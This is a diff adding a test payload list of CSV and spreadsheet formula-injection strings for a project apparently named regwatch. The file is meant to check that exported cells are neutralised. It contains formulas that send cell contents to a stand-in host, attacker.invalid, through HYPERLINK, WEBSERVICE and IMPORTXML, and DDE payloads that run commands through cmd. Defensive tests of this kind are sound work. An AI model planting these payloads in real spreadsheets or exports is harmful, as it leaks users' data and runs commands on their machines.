@@ -1,0 +1,22 @@
+# regwatch security payloads: CSV and spreadsheet formula injection (issue #12, REQ-25; docs/07-testing-quality.md 7.7)
+# Format: header lines start with "#"; after the header, one payload per line. Blank lines are ignored.
+# encoding: escaped (the loader decodes \n, \t, \r, \\ and \uXXXX)
+# Use: put each payload in item titles, summaries, tags and saved-view names, export to CSV, and
+# check that every cell starting with = + - @ tab or carriage return is neutralised (OWASP: prefix
+# with a single quote) and that quotes and line breaks stay inside one cell.
+=1+1
+=HYPERLINK("https://attacker.invalid/?d="&A1,"Click for details")
+=WEBSERVICE("https://attacker.invalid/?leak="&A2)
+=IMPORTXML(CONCAT("https://attacker.invalid/?v=",B2),"//a")
+=cmd|' /C calc'!A0
++cmd|' /C calc'!A0
+-2+3+cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0
+=DDE("cmd";"/C calc";"!A0")
+\t=1+1
+\r=1+1
+ =1+1
+"=1+1"
+Title with "quotes", commas, and\na line break
+=1+1;=2+2
+%0A=1+1
